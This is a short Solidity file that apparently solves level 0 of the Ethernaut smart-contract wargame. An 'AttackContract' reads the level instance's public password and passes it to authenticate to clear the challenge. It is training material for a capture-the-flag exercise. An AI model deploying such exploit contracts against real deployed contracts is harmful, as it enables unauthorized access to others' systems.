pragma solidity ^0.8.0;

import {Instance} from "ethernaut/00.sol";

contract AttackContract {
    Instance instance;

    constructor(address _instance) {
        instance = Instance(_instance);
    }

    function exploit() public {
        string memory password = instance.password();
        instance.authenticate(password);
        require(instance.getCleared());
    }
}
